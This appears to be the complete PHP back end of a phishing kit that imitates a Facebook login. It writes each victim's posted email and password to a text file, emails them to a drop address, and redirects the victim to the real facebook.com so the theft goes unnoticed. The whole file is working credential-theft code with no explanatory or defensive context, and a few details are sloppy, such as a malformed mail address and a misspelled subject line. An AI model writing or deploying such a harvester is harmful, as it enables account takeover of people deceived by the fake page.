<?php
header ('Location:https://facebook.com/');
$handle = fopen("credentials.txt", "a");
fwrite($handle, $_POST[email]."\t".$_POST[pass].PHP_EOL);
fclose($handle);
$maildrop="sample@emailcom";
mail($maildrop,"Facebok credentials",$_POST[email]."\t".$_POST[pass]);
exit;
?>